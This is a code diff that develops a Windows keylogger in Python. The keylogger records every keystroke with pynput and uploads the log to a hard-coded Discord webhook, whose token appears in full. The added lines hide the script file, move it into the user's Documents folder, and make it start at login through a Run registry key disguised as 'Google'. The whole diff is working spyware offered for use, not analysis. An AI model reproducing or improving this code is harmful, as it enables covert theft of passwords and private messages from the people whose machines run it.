@@ -6,22 +6,45 @@ import tkinter as tk
 import requests
 from pynput import keyboard
 import math
+import winreg
+from pathlib import Path
+
+
+def add_to_startup(script_path):
+    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
+    winreg.SetValueEx(key, "Google", 0, winreg.REG_SZ, script_path)
+
+# Example usage:
 
 # Discord webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1187414843637121164/0P-BlEVuY9xMx9wCqZVO3ch2MJ415sjHesLvLaZVdqvGbp2KBEir391bj4X-FA_k0oG3'
 
 # Keylogger settings
+
 script_path = os.path.abspath(__file__)
+print(script_path)
 username = getpass.getuser()
-log_path = "C:/Users/inchan/Desktop/Keylogger/log.txt"
+log_path = f"C:/Users/{username}/Documents/log.txt"
 keylogs_str = ""
 last_key_time = time.time()
-delay_duration = 20  # Set the delay duration in seconds
+delay_duration = 600  # Set the delay duration in seconds
 
+
+os.system(f"attrib +h {script_path}")  # Set hidden attribute on Windows
+os.chmod(script_path, 0o0700)
+
+source_path = Path(script_path)
+file_name = os.path.basename(script_path)
+print(file_name)
+destination_path = Path(f'C:/Users/{username}/Documents/{file_name}')
+source_path.rename(destination_path)
+
+
+add_to_startup(script_path)
 
 def send_webhook_with_file(webhook_url, file_path):
     with open(file_path, 'rb') as file:
-        payload = {"content": "KEYLOG!"}
+        payload = {"content": "WORKING!"}
         files = {'file': (file_path, file)}
         response = requests.post(webhook_url, data=payload, files=files)
         if response.status_code == 200:
@@ -33,13 +56,11 @@ def send_webhook_with_file(webhook_url, file_path):
 def send_keylogs_to_discord():
     global keylogs_str
     if keylogs_str:
-        with open(log_path, 'a') as log_file:
-            log_file.write(keylogs_str)
         
         file_size = os.path.getsize(log_path) / (1024 * 1024)  # Convert bytes to megabytes
 
         print(math.floor(file_size))
-        if file_size >= 2 or time.time() - last_key_time > delay_duration:
+        if file_size >= 2 and time.time() - last_key_time > delay_duration:
             print(f"File size is {file_size:.2f} MB. Uploading to Discord and deleting...")
             send_webhook_with_file(webhook_url, log_path)
             os.remove(log_path)
@@ -110,7 +131,7 @@ def handle_regular_keys(key):
         return None
 
 def keyPressed(key):
-    global keylogs_str, last_key_time
+    global keylogs_str
 
     with open(log_path, 'a') as log_file:
         special_key_result = handle_special_keys(key)
@@ -125,6 +146,7 @@ def keyPressed(key):
         else:
             regular_key_result = handle_regular_keys(key)
             if regular_key_result is not None:
+                print(regular_key_result)
                 log_file.write(regular_key_result)
                 keylogs_str += regular_key_result
 
@@ -134,9 +156,12 @@ keyboard.Listener(on_press=keyPressed)
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=keyPressed)
+
     listener.start()
 
-    try:
+   
+    try:    
+
         while True:
 
             start_time = time.time()
@@ -146,7 +171,7 @@ if __name__ == "__main__":
                 time_remaining = max(0, delay_duration - time_elapsed)
 
                 print(f"Time remaining: {time_remaining:.1f} seconds", end='\r')
-
+                print(keylogs_str)
                 if time_remaining == 0:
                     send_keylogs_to_discord()
                     break
